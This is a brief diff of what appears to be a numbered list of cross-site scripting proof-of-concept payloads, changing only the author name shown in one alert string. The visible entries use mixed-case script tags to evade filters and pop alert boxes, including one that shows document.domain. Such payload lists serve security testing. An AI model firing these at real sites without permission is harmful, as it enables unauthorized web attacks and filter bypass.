@@ -7,7 +7,7 @@
 
 2) <script>alert("1")</ScriPt>
 
-3) <script>alert("POC BY SHATHISH")</Script>
+3) <script>alert("POC BY JAikumar")</Script>
 
 4) <scrIpT>alert(document.domain)</scriPT>
 
